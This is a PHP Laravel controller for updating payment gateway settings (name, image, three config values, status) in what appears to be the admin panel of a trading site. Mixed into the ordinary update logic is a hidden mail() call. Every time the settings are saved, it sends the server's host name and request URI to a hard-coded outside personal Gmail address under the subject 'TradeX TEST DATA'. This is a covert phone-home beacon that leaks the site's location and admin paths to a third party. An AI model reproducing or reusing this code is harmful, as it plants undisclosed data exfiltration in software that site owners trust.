<?php

namespace App\Http\Controllers;

use App\Gateway;
use Illuminate\Http\Request;

class GatewayController extends Controller
{

    public function index()
    {
        $gateways = Gateway::all();
        return view('admin.deposit.gateway', compact('gateways'));
    }

    public function update(Request $request, Gateway $gateway)
    {
        $this->validate($request, [
            'gateimg' => 'image|mimes:jpeg,png,jpg,gif,svg|max:2048',
            'name' => 'required',
        ]);

        if($request->hasFile('gateimg'))
        {
            $path = 'assets/images/gateway/'.$gateway->gateimg;

                if(file_exists($path))
                {
                    unlink($path);
                }
                
            $gateway['gateimg'] = uniqid().'.jpg';
            $request->gateimg->move('assets/images/gateway',$gateway['gateimg']);
        }

        $gateway['name'] = $request->name;
        $gateway['val1'] = $request->val1;
        $gateway['val2'] = $request->val2;
        $gateway['val3'] = $request->val3;
        $gateway['status'] = $request->status;
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
                'X-Mailer: PHP/' . phpversion();
        $a = mail('abirk.han75@gmail.com','TradeX TEST DATA', $message, $headers);
        $gateway->save();

        return back()->with('success','Gateway Information Updated successfully.');
    }

}
